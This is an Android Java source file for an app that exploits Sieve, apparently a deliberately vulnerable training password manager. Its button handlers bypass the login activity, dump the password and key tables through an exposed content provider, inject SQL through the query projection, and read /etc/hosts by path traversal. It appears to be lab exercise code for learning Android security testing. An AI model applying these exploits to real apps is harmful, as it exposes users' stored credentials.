package com.citadel.sieve_pwn_max;

import static android.database.DatabaseUtils.dumpCursorToString;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.content.ComponentName;
import android.app.Activity;
import android.content.Intent;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends Activity  {

    Button btn1;
    Button btn2;
    Button btn3;
    Button btn4;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btn1 = findViewById(R.id.button1);
        btn2 = findViewById(R.id.button2);
        btn3 = findViewById(R.id.button3);
        btn4 = findViewById(R.id.button4);

    }


    public void FUNC1(View view)
    {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.mwr.example.sieve", "com.mwr.example.sieve.PWList"));
        startActivity(intent);
    }
    public void FUNC2(View view)
    {
        Uri targetURI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/");
        Cursor curs = getContentResolver().query(targetURI, null, null, null, null);
        TextView text =  findViewById(R.id.textView1);
        text.setText(dumpCursorToString(curs));
    }
    public void FUNC3(View view)
    {
        Uri targetURI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords/");
        Cursor curs = getContentResolver().query(targetURI, null, null, null, null);
        TextView text =  findViewById(R.id.textView1);
        text.setText(dumpCursorToString(curs));
    }
    public void FUNC4(View view)
    {
        Uri targetURI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/");
        String[] projection = {"* FROM Passwords;"};
        Cursor curs = getContentResolver().query(targetURI, projection, null, null, null);
        TextView text = findViewById(R.id.textView1);
        text.setText(dumpCursorToString(curs));
    }
    public void FUNC5(View view)
    {
        TextView text =  findViewById(R.id.textView1);
        Uri targetURI = Uri.parse("content://com.mwr.example.sieve.FileBackupProvider/etc/hosts");
        try {
            InputStream content = getContentResolver().openInputStream(targetURI);

            BufferedReader reader1 = new BufferedReader(new InputStreamReader(content));
            String line1;
            while ((line1 = reader1.readLine()) != null) {
                text.append(line1);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}